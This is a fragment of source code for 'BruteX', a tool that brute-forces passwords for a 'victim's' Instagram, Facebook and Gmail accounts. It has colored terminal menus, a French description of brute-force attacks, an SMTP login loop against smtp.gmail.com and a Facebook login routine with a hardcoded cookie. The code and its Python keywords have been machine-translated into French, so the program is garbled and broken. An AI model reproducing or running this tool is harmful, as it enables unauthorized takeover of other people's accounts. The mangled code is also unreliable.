...
\033 [1;91m[ \033 [1;97m2 \033 [1;91m] \033 [1;92m Personnalisé
\033 [1;91m[ \033 [1;97m3 \033 [1;91m] \033 [1;92m Retour
\033 [1;91m[ \033 [1;97m0 \033 [1;91m] \033 [1;92m Quitter
...
\033 [1;97m➤ \033 [1;92mUne attaque par force brute est une attaque cryptanalytique qui peut, en théorie, être utilisée pour tenter de déchiffrer n'importe quelle donnée chiffrée (à l'exception des données chiffrées d'une manière théoriquement sécurisée). [1] Une telle attaque peut être utilisée lorsqu'il n'est pas possible de tirer parti d'autres faiblesses d'un système de chiffrement (s'il en existe) qui faciliteraient la tâche.
Lors de la recherche de mots de passe, cette méthode est très rapide lorsqu'elle est utilisée pour vérifier tous les mots de passe courts, mais pour les mots de passe plus longs, d'autres méthodes telles que l'attaque par dictionnaire sont utilisées car une recherche par force brute prend trop de temps. Les mots de passe, les phrases de passe et les clés plus longs ont plus de valeurs possibles, ce qui les rend exponentiellement plus difficiles à déchiffrer que les plus courts.[2]
Les attaques par force brute peuvent être rendues moins efficaces en obscurcissant les données à encoder, ce qui rend plus difficile pour un attaquant de reconnaître quand le code a été craqué ou en obligeant l'attaquant à faire plus de travail pour tester chaque supposition. L'une des mesures de la force d'un système de cryptage est le temps qu'il faudrait théoriquement à un attaquant pour monter une attaque par force brute réussie contre lui.[3]
Les attaques par force brute sont une application de la recherche par force brute, la technique générale de résolution de problèmes consistant à énumérer tous les candidats et à vérifier chacun d'eux.
\033 [1 91 m[ \033 [1 97 m ? \033 [1;91m] \033 [1;92m Caractéristiques de BruteX :
\033 [1;97m➤ \033 [1;92mVous pouvez attaquer brutalement l'Instagram, Facebook et l'identifiant de messagerie de votre victime avec 100 mots de passe/seconde, vous pouvez ajouter votre propre liste de mots de passe personnalisée et cet outil a également une liste de mots de passe, donc si vous ne Vous n'avez pas votre propre liste de mots de passe, alors ça va, ne vous inquiétez pas, vous pouvez utiliser la fonction d'attaque automatique (dans cette fonction, vous n'avez pas besoin de votre propre liste de mots de passe).
\033 [1 91 m[ \033 [1 97 m ? \033 [1;91m] \033 [1;92m Auteur :
\033 [1;97m➤ \033 [1;92mTool BruteX est créé par MrHacker-X
\033 [1;92m""" )

soc  =  """ \033 [1;91m[ \033 [;1;97m01 \033 [1;91m] \033 [1;92mSélectionnez les options
...
\033 [1;91m[ \033 [;1;97m05 \033 [1;91m] \033 [1;92mTélégramme
\033 [1;91m[ \033 [;1;97m99 \033 [1;91m] \033 [1;92mRetour
\033 [1;91m[00] \033 [1;91mQuitter
\033 [1 97 m[ \033 [1 91 m ?? \033 [1;97m] \033 [1;91mbrutex>> \033 [1;92m"""

définitivement  par défaut ():
	classer  GmailBruteForce () :
	    ...
	    def  get_pass_list ( soi , chemin ):
	        ...
	        pour  ligne  d' entrée  le fichier :
	            soi . mots de passe . ajouter ( ligne )
	
	    def  init_smtplib ( soi ):
	        soi . smtp  =  smtplib . SMTP ( "smtp.gmail.com" , 587 )
	        soi . smtp . débuts ()
	        soi . smtp . ehlo ()
	    ...
	    def  try_gmail ( self ):
	        ...
	        pour  l'utilisateur  en  soi .comptes :
	            pour le mot de  passe  en  soi .mots de passe :
	                essayer :
	                    soi . smtp . login ( utilisateur , mot de passe )
 ...
 hackbook def ():
	...
	def  create_form ():
		formulaire = dict ()
		cookie = { 'en' : '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy' }
	
		données = requêtes . obtenir ( post_url , en-têtes = en-têtes )
		pour  moi  dans  les données . biscuits :
	...
	je = 0
	 fichier while :
		passw = fichier . ligne de lecture (). bande ()
		je += 1
		si  len ( passw ) <  6 :
			Continuez
		print ( str ( i ) + " : " , passw )
	...
	si  menu  ==  '01'  ou  menu  ==  '1' :
		...
		tandis que  Vrai :
			...
			si  pas  ==  '01'  ou  pas  ==  '1' :
				...
				imprimer ()
				passlist  =  input ( ' \033 [1;91m[ \033 [1;97m? \033 [1;91m] \033 [1;92m Chemin de la liste de mots de passe : \033 [1;97m' )
		...
		impression ( banr )
		imprimer ()
		print ( " \033 [1;91m[ \033 [;1;97m~ \033 [1;91m] \033 [1;92mMerci d'avoir utilisé mon outil 'BruteX'. Vous pouvez me suivre sur divers sites de médias sociaux. Lien et les options sont données ci-dessous, alors sélectionnez ici les options où vous voulez me suivre " )
		imprimer ()
		imprimer ()
		tandis que  Vrai :
			fol  =  entrée ( soc )
